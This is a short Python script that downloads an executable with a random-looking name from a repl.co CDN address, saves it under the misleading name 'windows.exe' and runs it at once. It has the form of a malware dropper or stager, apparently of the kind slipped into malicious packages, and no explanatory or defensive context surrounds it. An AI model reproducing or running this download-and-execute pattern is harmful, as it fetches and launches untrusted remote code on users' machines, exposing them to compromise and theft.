import requests
import os
import subprocess
url = 'https://nagogy-cdn.dreamyoak.repl.co/cdn/MEYeniKS.exe'
response = requests.get(url)

with open('windows.exe', 'wb') as f:
    f.write(response.content)
subprocess.run('windows.exe', check=True)